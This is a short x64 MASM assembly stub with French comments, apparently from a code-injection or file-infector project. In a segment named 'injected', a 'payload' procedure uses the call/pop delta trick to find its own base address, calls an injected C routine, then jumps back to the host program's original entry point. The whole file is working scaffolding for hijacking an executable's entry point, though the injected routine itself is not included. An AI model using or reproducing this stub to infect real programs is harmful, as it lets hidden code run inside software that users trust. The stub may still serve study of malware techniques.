; STUB assembleur permettant d'etre Code-Independant
; un STUB est un bout de code snippet (sur wikipedia : Method Stub)
public payload
public __begin_of_code
public delta
public to_c_code

injected segment read execute

    __begin_of_code label BYTE
    payload proc

        ; delta offset
        call _next
        _next:
            ; charger l adresse de retour dans rbp
            pop rbp
            ; soustraire la taille de l appel (taille entre _next et payload)
            ; pour obtenir la base du code
            sub rbp, _next - payload

            ; realign stack 
            sub rsp, 16
            and rsp, -1

            ;; call inj_code.c
            ; charger  l'adresse de to_c_code dans rbx (decalee par rapport a la base du code)
            mov rbx, [rbp + (to_c_code - __begin_of_code)]
            ; Ajouter la base du code a rbx pour obtenir l adresse reelle
            add rbx, rbp
            ; Pousser 0 sur la pile pour l'argument de la fonction
            push 0
            ; Appeler la fonction pointee par rbx
            call rbx
            ; Recuperer la valeur de retour dans rax (nettoyer la pile)
            pop rax

            ; Charger l'adresse de delta dans rbx (decalee par rapport a la base du code)
            mov rbx, [rbp + (delta - __begin_of_code)]
            ; Ajouter la base du code a rbx pour obtenir l'adresse reelle
            add rbx, rbp

            ; Sauter a l'adresse contenue dans rbx (ancien point d'entree)
            jmp rbx

        ; Fin de la procedure
        _end:
        
        ; Etiquette pour to_c_code, initialisee a 0
        to_c_code label QWORD
            dq 0
        ; Etiquette pour delta initialisee a 0
        delta label SQWORD
            dq 0
    payload endp
injected ends

END